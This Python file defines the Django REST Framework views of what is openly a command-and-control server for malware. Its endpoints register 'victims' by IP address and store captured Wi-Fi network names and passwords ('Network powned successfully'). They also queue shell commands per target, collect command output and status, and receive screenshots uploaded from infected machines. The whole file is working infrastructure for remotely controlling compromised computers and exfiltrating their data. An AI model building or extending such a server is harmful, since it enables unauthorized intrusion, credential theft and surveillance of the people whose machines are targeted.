from rest_framework import response
from rest_framework.views import APIView
from django.core.files.storage import default_storage
from django.conf import settings
from .serializers import *
from .models import *
import os

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]  # Use the first IP in the list
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


class VictimeView(APIView):
    def get(self, request):
        victims = Target.objects.all().order_by('-created')
        return response.Response(VictimsSerializer(victims, many=True).data)

    def post(self, request):
        data = request.data
        name = data.get('name')
        ip = get_client_ip(request)
        
        if Target.objects.filter(name=name, ip=ip).exists():
            return response.Response({'message' : 'Victim already registered !!!'})
            
        Target.objects.create(
            name=name,
            ip=ip,
        )
        
        return response.Response({'message': 'Victim added successfully !!!'})
    

class Register(APIView):
    def post(self, request):
        data = request.data
        user = data.get('name')
        network = data.get('ussid')
        password = data.get('password')
        
        if Network.objects.filter(name=user, ussid=network).exists():
            return response.Response({'message' : 'Network already registered !!!'})
            
        Network.objects.create(
            name=user,
            ussid=network,
            password=password,
        )
        
        return response.Response({'message': 'Network powned successfully !!!'})
        
class Control(APIView):
    def get(self, request):
        target = request.GET.get('target')
        print(target)
        commands = Command.objects.filter(target=target)
        if not commands or not target:
            commands = Command.objects.all()
            return response.Response(CommandsSerializer(commands, many=True).data)
        return response.Response(CommandsSerializer(commands, many=True).data)
    
    def post(self, request):
        data = request.data
        target = data.get('target')
        command = data.get('command')
        
        if Command.objects.filter(target=target, command=command).exists():
            return response.Response({'message' : 'Command already registered !!!'})
            
        Command.objects.create(
            target=target,
            command=command,
        )
        
        return response.Response({'message': 'Command registered successfully !!!'})

    def delete(self, request):
        command = request.GET.get('command')
        Command.objects.filter(command=command).delete()
        return response.Response({'message': 'Command deleted successfully !!!'})
    
class StatesView(APIView):
    def get(self, request):
        target = request.GET.get('target')
        if not target:
            states = State.objects.all().order_by("-created")
            return response.Response(StateSerializer(states, many=True).data)
        return response.Response(StateSerializer(State.objects.filter(target=target).order_by("-created"), many=True).data)
    
    def post(self, request):
        data = request.data
        target = data.get('target')
        state_value = data.get('state')
        if State.objects.filter(target=target).exists():
            State.objects.filter(target=target).delete()
        State.objects.create(
            target=target,
            state=state_value,
        )
        
        return response.Response({'message': 'State updated successfully !!!'})

class LogView(APIView):
    def get(self, request):
        target = request.GET.get('target')
        cmd = request.GET.get('cmd')
        logs = Log.objects.filter(target=target,command=cmd)
        if not logs or not target:
            logs = Log.objects.all().order_by('-created')
            return response.Response(LogSerializer(logs, many=True).data)
        return response.Response(LogSerializer(logs, many=True).data)
    def post(self, request):
        data = request.data
        target = data.get('target')
        log = data.get('log')
        cmd = data.get('command')
        
        Log.objects.create(
            target=target,
            log=log,
            command=cmd,
        )
        
        return response.Response({'message': 'Command executed successfully !!!'})

    def delete(self, request):
        target = request.GET.get('target')
        cmd = request.GET.get('command')
        Log.objects.filter(target=target,command=cmd).delete()
        return response.Response({'message': 'Log deleted successfully !!!'})
    
class UploadView(APIView):

    def post(self, request):
        data = request.data
        target = data.get('target')

        if 'file' not in request.FILES:
            return response.Response({'error': 'No file provided!'}, status=400)

        file = request.FILES['file']
        file_path = os.path.join('uploads', file.name)

        try:
            saved_path = default_storage.save(file_path, file)
            file_url = os.path.join(settings.MEDIA_URL, saved_path)


            Log.objects.create(
                target=target,
                log=f'image uploaded sucessfuly and save on {file_path}',
                img=file_url,
                command="screen shot",
            )

            return response.Response({
                'message': 'File uploaded successfully!',
                'file_path': file_url,
            })
        except Exception as e:
            return response.Response({'error': str(e)}, status=500)